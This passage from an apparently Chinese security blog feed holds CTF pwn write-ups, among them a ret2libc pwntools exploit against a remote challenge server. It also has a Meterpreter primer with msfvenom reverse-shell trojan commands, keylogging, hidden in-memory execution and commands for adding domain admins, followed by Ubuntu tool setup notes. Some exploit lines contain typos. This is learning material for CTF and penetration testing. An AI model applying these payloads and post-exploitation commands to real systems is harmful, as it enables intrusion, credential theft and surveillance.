class="hljs-keyword">if</span> ( j &lt;= <span class="hljs-number">0x63</span> )<br>          {<br>            v3 = j++;<br>            v13[v3] = v7;<br>          }<br>        }<br>        <span class="hljs-keyword">if</span> ( v6 &gt; <span class="hljs-number">2</span> )<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">1</span> )<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"id\t\tnumber"</span>);<br>        <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; j; ++k )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\t\t%d\n"</span>, k, v13[k]);<br>      }<br>      <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"which number to change:"</span>);<br>      __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v5);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"new number:"</span>);<br>      __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v7);<br>      v13[v5] = v7;<br>    }<br>    <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">4</span> )<br>      <span class="hljs-keyword">break</span>;<br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt; j; ++l )<br>      v9 += v13[l];<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>发现没有检查v13数组边界，当选择3.change number时程序没有对v5进行检测，存在数组越界，产生溢出：</p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">puts</span>(<span class="hljs-string">"which number to change:"</span>)<span class="hljs-comment">;</span><br>     __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;<span class="hljs-built_in">v5</span>)<span class="hljs-comment">;</span><br>     puts(<span class="hljs-string">"new number:"</span>)<span class="hljs-comment">;</span><br>     __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;<span class="hljs-built_in">v7</span>)<span class="hljs-comment">;</span><br>     v13[<span class="hljs-built_in">v5</span>] = <span class="hljs-built_in">v7</span><span class="hljs-comment">;</span><br></code></pre></td></tr></tbody></table></figure><p>发现给了/bin/bash:</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">:0804859B <span class="hljs-comment">; __unwind {</span><br><span class="hljs-symbol">.text:</span>0804859B                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">ebp</span><br><span class="hljs-symbol">.text:</span>0804859C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">esp</span><br><span class="hljs-symbol">.text:</span>0804859E                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">18h</span><br><span class="hljs-symbol">.text:</span>080485A1                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, large <span class="hljs-built_in">gs</span>:<span class="hljs-number">14h</span><br><span class="hljs-symbol">.text:</span>080485A7                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_C], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>080485AA                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>080485AC                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>080485AF                 <span class="hljs-keyword">push</span>    offset command  <span class="hljs-comment">; "/bin/bash"</span><br><span class="hljs-symbol">.text:</span>080485B4                 <span class="hljs-keyword">call</span>    _system <span class="hljs-comment">;system</span><br><span class="hljs-symbol">.text:</span>080485B9                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">10h</span><br><span class="hljs-symbol">.text:</span>080485BC                 <span class="hljs-keyword">nop</span><br><span class="hljs-symbol">.text:</span>080485BD                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">ebp</span>+var_C]<br><span class="hljs-symbol">.text:</span>080485C0                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, large <span class="hljs-built_in">gs</span>:<span class="hljs-number">14h</span><br><span class="hljs-symbol">.text:</span>080485C7                 <span class="hljs-keyword">jz</span>      short locret_80485CE<br><span class="hljs-symbol">.text:</span>080485C9                 <span class="hljs-keyword">call</span>    ___stack_chk_fail<br></code></pre></td></tr></tbody></table></figure><p>开启动态调试，在v13[v5]=v7处下断点，</p><p><img src="https://i.loli.net/2020/07/31/ClcWPX8p29JHxQk.png" alt="linux输入.PNG"></p><p>转到IDA界面，查看此地址，此时edx存入的即为输入的数字9，在栈中的位置是：</p><p><img src="https://i.loli.net/2020/07/31/j24baYfNMdlRrGD.png" alt="捕获.PNG"></p><p>得到了输入在栈中的位置，找到返回地址的位置覆盖掉就可以了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 level3</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/</url>
    
    <content type="html"><![CDATA[<p>这道题对于我来讲好难好难啊，涉及到了很多新的知识。<br>首先checksec</p><p><img src="https://i.loli.net/2020/05/08/uFc1bxINidnvHVl.png" alt="17627983-3b321a2edea9a331.png"></p><p>:可以直接栈溢出；基地址不变化；对数据有执行权限。</p><p>查看main()函数：</p><p><img src="https://i.loli.net/2020/05/08/eFk7XyEv6ZKtGxd.png" alt="17627983-fde84f52ba2311ab.png"></p><p>查看函数function()：</p><p><img src="https://i.loli.net/2020/05/08/doMwxehS3tCsbFq.png" alt="捕获.PNG"></p><p>无system,无/bin/sh，给了一个共享文件libc_32.so.6,明显为ret2libc。</p><blockquote><p>ret2libc (return-into-libc)是一种利用缓冲区溢出的代码复用技术，主要通过覆盖栈帧的返回地址（EIP），使其返回到系统中的库函数，利用库函数中已有的功能来实施attack，而不是直接定位到注入的shellcode。system函数属于libc，而libc.so动态链接库中的函数之间相对偏移是固定的。即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变，用工具来找到对应的libc文件。</p></blockquote><blockquote><p>ret2libc特征：1、没有/bin/sh；2、没有system和/bin/sh；3、无system和/bin/sh，但是给了libc.so文件；4、这三个全都没有。</p></blockquote><blockquote><p>ASLR：地址空间布局随机化，ios,android,windows,macos,linux的当前版本都具有ASLR保护。主要用于防止缓冲区溢出攻击，ASLR与虚拟内存管理一起工作，将程序的不同部分的位置随机化，令攻击者不能通过尝试和错误了解目标位置，因为地址将不同。</p></blockquote><p>read()函数中，buf大小为0x88，但是在函数中竟然规定了256之大。明显的栈溢出。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>libc内的地址是随机的，但是函数的相对地址是不变的，只要知道其中某一个函数的地址，再利用相对位移计算出我们所需要的函数的地址，如果知道read或write函数的地址就可以计算出其他函数的地址。</p><p>某大佬攻击思路：</p><p>（1）通过function()中的read构造栈溢出，并且覆写返回地址为plt中的write地址。（2）通过wirte泄露read在内存中的绝对地址，并且接着调用function()（注：got中的read保存着read在内存中的真实地址）（3）计算出system和/bin/sh的绝对地址，再通过function构造栈溢出进行覆写。（4）成功</p><blockquote><p>plt：procedure Linkage Table，延迟绑定，函数第一次用到时才进行绑定（符号查找，重定位等）；<br>实现手法：增加一层间接跳转。<br>调用函数时并不直接通过GOT跳转，而是通过一个叫做PLT的项的结构来进行跳转，每个外部函数在PLT中都有一个相应的项。<br>ELF将GOT拆分成两个表叫做.got和.got.plt。<br>.got用来保存全局变量引用的地址<br>.got.plt用来保存函数引用的地址，外部函数的引用全部放到 .plt.got中。</p></blockquote><p><strong>思路</strong> </p><p>通过read覆盖返回地址没执行两次main函数，第一次泄露write函数的地址，第二次执行system函数。</p><p>exp:</p><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">52277</span>)<br> # p=process("./level3")<br> # 获取文件对象<br>elf=ELF(<span class="hljs-string">'./level3'</span>)<br> #获取lib库对象<br>libc=ELF(<span class="hljs-string">'./libc_32.so.6'</span>)<br> #获取函数<br>wirte_plt=elf.plt[<span class="hljs-string">'write'</span>]<br>write_got=elf.got[writ<span class="hljs-string">e']</span><br><span class="hljs-string">main_addr=elf.sym['</span>main<span class="hljs-string">']</span><br><span class="hljs-string"> #接受数据</span><br><span class="hljs-string">p.recvuntil(":\n")</span><br><span class="hljs-string">  #char[88],ebp write函数地址，write函数返回地址（返回到main函数） write函数参数一（1）  write函数参数二（write_got的地址）write参数三（写4字节）</span><br><span class="hljs-string">payload=0x88*'</span>a<span class="hljs-string">'+p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br><span class="hljs-string">p.sendline(payload)</span><br><span class="hljs-string"> #获取wirte在got中的地址</span><br><span class="hljs-string">write_got_addr=u32(p.recv())</span><br><span class="hljs-string">print hex(write_got_addr)</span><br><span class="hljs-string"> # 计算lib库加载基址</span><br><span class="hljs-string">libc_base=write_got_addr-libc.sym['</span>writ<span class="hljs-string">e']</span><br><span class="hljs-string">print hex(libc_base)</span><br><span class="hljs-string"> # 计算system的地址</span><br><span class="hljs-string">system_addr=libc_base+libc.sym['</span><span class="hljs-keyword">system</span><span class="hljs-string">']</span><br><span class="hljs-string">print hex(bin_sh_addr)</span><br><span class="hljs-string"> #计算字符串/bin/sh 的地址。0x15902b为偏移，通过命令：strings -a -t x libc_32.so.6 | grep "/bin/sh"获取</span><br><span class="hljs-string">bin_sh_addr=libc_base+0x15902b</span><br><span class="hljs-string">print hex(bin_sh_addr)</span><br><span class="hljs-string"> #char [88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)</span><br><span class="hljs-string">payload2=0x88*'</span>a<span class="hljs-string">'+p32(0xdeadbeef)+p32(system_addr)+p32(0x11111111)+p32(bin_sh_addr)</span><br><span class="hljs-string"> #接受数据</span><br><span class="hljs-string">p.recvuntil(":\n")</span><br><span class="hljs-string"> #发送payloas</span><br><span class="hljs-string">p.sendline(payload2)</span><br><span class="hljs-string"> #切换交互模式</span><br><span class="hljs-string">p.interactive()</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识Meterpreter</title>
    <link href="/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/"/>
    <url>/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h2><p>metrepreter 是metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道，使用它作为攻击载荷能够获得目标系统的一个meterpreter shell的链接。</p><blockquote><p>meterpreter shell作为渗透模块有很多有用的功能，如：添加用户、隐藏、打开shell、得到用户密码、上传下载远程主机文件、运行cmd、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息 网络接口 ip地址等信息。<br>Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，不改变系统硬盘中的文件<br>Meterpreter 是一种后渗透工具，属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型payload，此工具基于内存DLL注入理念实现，通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现。</p></blockquote><h2 id="Meterpreter中常用反弹类型"><a href="#Meterpreter中常用反弹类型" class="headerlink" title="Meterpreter中常用反弹类型"></a>Meterpreter中常用反弹类型</h2><h3 id="1-reverse-tcp"><a href="#1-reverse-tcp" class="headerlink" title="1.reverse_tcp"></a>1.reverse_tcp</h3><p>基于TCP的反向链接反弹shell，使用稳定。</p><ul><li><p>Linux:</p><ul><li>linux下反弹shell木马：</li><li><code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f elf -o shell</code></li><li>目录下生成木马文件isshell，为文件加可执行权限，打开metasploit，使用模块handler设置payload(与生成木马所使用payload一致)</li><li>设置地址和端口，开始监听。</li><li>运行反弹shell木马，成功反弹回shell</li></ul></li><li><p>Windows:</p><ul><li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的ip] lport=[端口] -f exe -o [要生成的文件名]</code></li><li><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe -o shell.exe</code></li></ul></li></ul><h3 id="2-reverse-http"><a href="#2-reverse-http" class="headerlink" title="2.reverse_http"></a>2.reverse_http</h3><p>基于http方式的反向连接，网速慢的情况下不稳定。</p><p><code>payload: /windows/meterpreter/reverse_http</code></p><h3 id="3-reverse-https"><a href="#3-reverse-https" class="headerlink" title="3.reverse_https"></a>3.reverse_https</h3><p>基于https方式的反向连接，网速慢的情况下不稳定，https若反弹没收到数据，可以将监听端口换成443试试。</p><p><code>payload: /windows/meterpreter/reverse_https</code></p><h3 id="4-bind-tcp"><a href="#4-bind-tcp" class="headerlink" title="4.bind_tcp"></a>4.bind_tcp</h3><p>基于TCP的正向连接shell，一般在内网使用，不需要设置LHOST。</p><p><code>msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o shell</code></p><p>加权运行。</p><h2 id="Meterpreter-常用命令"><a href="#Meterpreter-常用命令" class="headerlink" title="Meterpreter 常用命令"></a>Meterpreter 常用命令</h2><p>###1.基本命令</p><ul><li>help –查看Meterpreter帮助</li><li>background –返回，把meterpreter后台挂起</li><li>bgkill –杀死一个背景 meterpreter 脚本</li><li>bglist –提供所有正在运行的后台脚本的列表</li><li>bgrun –作为一个后台线程运行脚本</li><li>channel –显示活动频道</li><li>sessions -i number  –与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用</li><li>sesssions -k  number  –与会话进行交互</li><li>close –关闭通道</li><li>exit –终止 meterpreter 会话</li><li>quit –终止 meterpreter 会话</li><li>interact id  –切换进一个信道</li><li>run –执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等</li><li>irb –进入 Ruby 脚本模式</li><li>read –从通道读取数据</li><li>write –将数据写入到一个通道</li><li>run和bgrun –前台和后台执行以后它选定的 meterpreter 脚本</li><li>use –加载 meterpreter 的扩展</li><li>load/use –加载模块</li><li>Resource –执行一个已有的rc脚本</li></ul><h3 id="2-文件系统命令"><a href="#2-文件系统命令" class="headerlink" title="2.文件系统命令"></a>2.文件系统命令</h3><ul><li>cat c:\boot.ini –查看文件内容,文件必须存在</li><li>del c:\boot.ini –删除指定的文件</li><li>upload /root/Desktop/netcat.exe c:\  –上传文件到目标机主上，如upload  setup.exe C:\windows\system32\</li><li>download nimeia.txt /root/Desktop/   –下载文件到本机上如：download C:\boot.ini /root/或者download C:\“ProgramFiles”\Tencent\QQ\Users\295******125\Msg2.0.db /root/</li><li>edit c:\boot.ini   –编辑文件</li><li>getlwd –打印本地目录</li><li>getwd –打印工作目录</li><li>lcd –更改本地目录</li><li>ls –列出在当前目录中的文件列表</li><li>lpwd –打印本地目录</li><li>pwd –输出工作目录</li><li>cd c:\  –进入目录文件下</li><li>rm file  –删除文件</li><li>mkdir dier  –在受害者系统上的创建目录</li><li>rmdir –受害者系统上删除目录</li><li>dir –列出目标主机的文件和文件夹信息</li><li>mv –修改目标主机上的文件名</li><li>search -d d:\www -f web.config  –search 文件，如search  -d c:\  -f*.doc</li><li>meterpreter &gt; search -f autoexec.bat   –搜索文件</li><li>meterpreter &gt; search -f sea*.bat c:\xamp\</li><li>enumdesktops      –用户登录数</li><li>下载文件:使用命令“download +file path”,将下载目标机器的相对应权限的任何路径下的文件</li><li>上传文件: upload 命令为上传文件到我们的目标机器</li><li>查看文件: cat filename 在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。</li><li>切换、查询当前路径: pwd 命令将查询当前在dos命令下的路径，“cd”命令可以改变当前路径</li><li>sysinfo 命令: 显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是windows XP service pack 2，sp2这个系统有很多漏洞。</li><li>execute命令: 为目标主机上执行一个命令，其中“execute -h”显示帮助信息。-f为执行要运行的命令<ul><li>如果希望隐藏后台执行，加参数-H <code>execute  -H -f notepad.exe</code></li><li>我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上 <code>execute  -H -i -f cmd.exe</code></li><li>在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀  <code>execute  -H -m -d notepad.exe-f  wce.exe -a "-o wce.txt" </code><ul><li>-d 在目标主机执行时显示的进程名称（用以伪装）</li><li>-m 直接从内存中执行</li><li>-o wce.txt 是wce.exe的运行参数</li></ul></li></ul></li><li>idletime命令:为显示目标机器截止到当前无操作命令的时间</li><li>search命令:在目标主机搜索特定的文件。该命令能够通过搜索整个系统或特定的文件夹。使用<code>search –h</code>命令来查看search命令的帮助信息</li><li>edit命令: 调用vi编辑器，对目标主机上的文件修改</li></ul><h3 id="3-网络命令"><a href="#3-网络命令" class="headerlink" title="3.网络命令"></a>3.网络命令</h3><ul><li><p>ipconfig/ifconfig –显示网络接口的关键信息，包括 IP 地址</p></li><li><p>portfwd  add -l 4444 -p 3389 -r 192.168.1.102  –端口转发,本机监听4444,把目标机3389转到本机4444</p></li><li><p>netstat -an | grep“4444”   –查看指定端口开放情况</p></li><li><p>rdesktop -u Administrator -p bk#123 127.0.0.1:4444  –使用rdesktop来连接桌面，-u 用户名 -p 密码</p></li><li><p>rdesktop 127.1.1.0:4444  –需要输入用户名和密码远程连接</p></li><li><p>route –查看或修改受害者路由表</p><ul><li>route add 192.168.1.0 255.255.255.0 1  –添加动态路由</li><li>route print  –路由表输出</li></ul></li><li><p>runget_local_subnets  –目标主机的内网IP段情况</p></li><li><p>Arp       –看ARP缓冲表</p></li><li><p>Getproxy     –获取代理</p></li><li><p>portfwd：网络命令则有列出ip信息(ipconfig),展示修改路由表(route),还有端口转发(portfwd)。</p></li></ul><h3 id="4-键盘监听"><a href="#4-键盘监听" class="headerlink" title="4.键盘监听"></a>4.键盘监听</h3><ul><li>keyscan_start：开启键盘记录功能</li><li>keyscan_dump：显示捕捉到的键盘记录信息</li><li>keyscan_stop：停止键盘记录功能</li><li>uictl enable keyboard/mouse –接管目标主机的键盘和鼠标。</li></ul><h3 id="5-系统命令"><a href="#5-系统命令" class="headerlink" title="5.系统命令"></a>5.系统命令</h3><ul><li>reboot –重新启动受害人的计算机</li><li>reg –与受害人的注册表进行交互</li><li>rev2self  –回到控制目标主机的初始用户账户下</li><li>shell –获得控制台权限</li><li>shutdown –关闭了受害者的计算机</li><li>sysinfo  –查看目标机系统信息，如机器名，操作系统等</li><li>add_user username password -h ip     –在远程目标主机上添加一个用户</li><li>add_group_user “Domain Admins” username -h ip    –将用户添加到目标主机的域管理员组中</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>chrome</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu16.04重装之各种环境搭建</title>
    <link href="/2022/08/09/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/08/09/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>环境：ubuntu16.04</p><h1 id="0x00-vmtools解决坑点"><a href="#0x00-vmtools解决坑点" class="headerlink" title="0x00 vmtools解决坑点"></a>0x00 vmtools解决坑点</h1><p>有点无语，笔者踩坑无数，没想到有一天在重装vmtool的时候还能……</p><p>正常安装vmtool后仍旧无法与主机进行复制粘贴，关掉虚拟机查看虚拟机设置。</p><p><img src="https://i.loli.net/2020/10/10/zOQ1jZT5SYip47N.png" alt="捕获.PNG"></p><p><img src="https://i.loli.net/2020/10/10/9pYJxdtsKFEUy4M.png" alt="捕获.PNG"></p><p>建立的共享文件夹要设置属性为共享式。</p><p>搞完之后……就可以了。</p><p>此处贴一个跟我一样的暴躁博主教程：<br><a href="https://blog.csdn.net/zerolity/article/details/81206476">https://blog.csdn.net/zerolity/article/details/81206476</a></p><h1 id="0x01-pwntools安装"><a href="#0x01-pwntools安装" class="headerlink" title="0x01 pwntools安装"></a>0x01 pwntools安装</h1><p>1.安装python2.7和pip</p><p><code>sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential </code></p><p>2.升级pip：<code>sudo pip install --upgrade pip</code></p><p>更改pip的配置文件/usr/bin/pip</p><p>更改为：</p><p><img src="https://i.loli.net/2020/10/10/zGq57OjUeWcxXnM.png" alt="捕获.PNG"></p><p>3.安装pwntools：<code>sudo pip install pwntools</code></p><p>报错超时，换个阿里源就好了。</p><p>3.1 更换阿里源</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo su<br><span class="hljs-built_in">cd</span> /etc/apt <span class="hljs-comment">#切换到apt源文件</span><br><span class="hljs-built_in">mv</span> source.list sources.list_bak <span class="hljs-comment">#备份源文件</span><br>vim sources.list <span class="hljs-comment">#新建一个，直接把下面的内容copy进去</span><br></code></pre></td></tr></tbody></table></figure><p>copy的内容：</p><figure class="highlight plaintext"><figcaption><span>deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs #">deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties<br>deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted<br>deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted<br>deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties<br>deb http://mirrors.aliyun.com/ubuntu/ xenial universe<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe<br>deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse<br>deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties<br>deb http://archive.canonical.com/ubuntu xenial partner<br>deb-src http://archive.canonical.com/ubuntu xenial partner<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted<br>deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe<br>deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse```<br><br>3.2 保存配置后，更新配置：`sudo apt-get update`<br><br>之后再重新步骤三的安装命令即可。<br><br>4.测试<br><br><br>![捕获.PNG](https://i.loli.net/2020/10/10/7wzfu32HFRiCXap.png)<br><br>无报错，返回了'1\xc0'，成功！<br><br>所以为啥第一次自己去安装pwntools的时候费了很多力气呢，感觉那时候踩坑无数到崩溃……<br><br># 0x02 GDB及三个插件的安装<br>在终端输入gdb，发现ubuntu16自带gdb，那我就直接安装插件得了。<br>* peda:做逆向破解<br>* gef：用于debug最好<br>* gdbinit：简单版<br><br>用git下载插件：<br>`git clone https://github.com/gatieme/GdbPlugins.git ~/GdbPlugins`<br><br>没有git的下载：`apt-get install git`<br><br>在目录GdbPlugin下可以看见三个插件，想用哪个插件就可以在该目录下输入对应命令：<br><br>```echo "source ~/GdbPlugins/peda/peda.py" &gt; ~/.gdbinit <br>echo "source ~/GdbPlugins/gef/gef.py" &gt; ~/.gdbinit <br>echo "source ~/GdbPlugins/gdbinit/gdbinit" &gt; ~/.gdbinit  <br></code></pre></td></tr></tbody></table></figure><h1 id="0x03-安装checksec"><a href="#0x03-安装checksec" class="headerlink" title="0x03 安装checksec"></a>0x03 安装checksec</h1><figure class="highlight plaintext"><figcaption><span>clone</span><a href="https://github.com/slimm609/checksec.sh.git">link</a></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs git">cd checksec.sh<br></code></pre></td></tr></tbody></table></figure><p>目录下的checksec本来想建立一个软链接过去/usr/local/bin里，但是一直打不开，于是直接用cp命令把checksec拷贝过去了。在/usr/local/bin能够打开checksec，才算成功。</p><h1 id="0x04-安装docker-pikachu靶场"><a href="#0x04-安装docker-pikachu靶场" class="headerlink" title="0x04 安装docker+pikachu靶场"></a>0x04 安装docker+pikachu靶场</h1><h4 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h4><ul><li>先卸载可能存在的旧版本： <code>$ sudo apt-get remove docker docker-engine docker-ce docker.io</code></li><li>更新apt包索引: <code>$ sudo apt-get update</code></li><li>安装以下包以使apt可以通过HTTPS使用存储库（repository）: <code>$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</code></li><li>添加Docker官方的GPG密钥： <code>$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></li><li>使用下面的命令来设置stable存储库： <code>$ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</code></li><li>再更新一下apt包索引: <code>$ sudo apt-get update</code></li><li>安装最新版本的Docker CE：<code>$ sudo apt-get install -y docker-ce</code></li><li>查看docker服务是否启动： <code>$ systemctl status docker</code></li><li>若未启动，则启动docker服务: <code>$ sudo systemctl start docker</code></li><li>经典的hello world： <code>$ sudo docker run hello-world</code></li></ul><p><img src="https://i.loli.net/2020/10/13/kofhug8n2VNj1bx.png" alt="捕获.PNG"></p><p>如图输出则表示docker安装成功。</p><h4 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h4>]]></content>
    
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UAF漏洞简单学习</title>
    <link href="/2022/08/09/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
